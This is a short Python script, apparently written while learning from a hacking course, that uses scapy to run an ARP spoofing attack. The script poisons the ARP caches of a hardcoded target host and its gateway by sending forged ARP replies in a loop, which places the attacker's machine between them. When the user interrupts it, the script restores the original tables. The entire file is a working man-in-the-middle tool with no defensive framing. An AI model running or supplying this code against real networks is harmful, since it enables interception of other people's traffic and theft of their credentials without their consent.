#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    #scapy.arping(ip)
    arp_request = scapy.ARP(pdst=ip)
    #arp_request.pdst = ip
    # it will work without the dst="...", but will warn for every data sent out that dst is not configured and defaulting to broadcast Id
    #broadcast = scapy.Ether() 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2 means ARP response
    # we are sending a ARP resonse (without a request) to the victim, with the source IP of the gatway
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #packet.show()
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    #print(packet.show())
    #print(packet.summary())

target_ip = "192.168.43.42"
gateway_ip ="192.168.43.1"

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets Sent: " + str(sent_packet_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Detected CTRL + C.....Resetting ARP tables....Please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    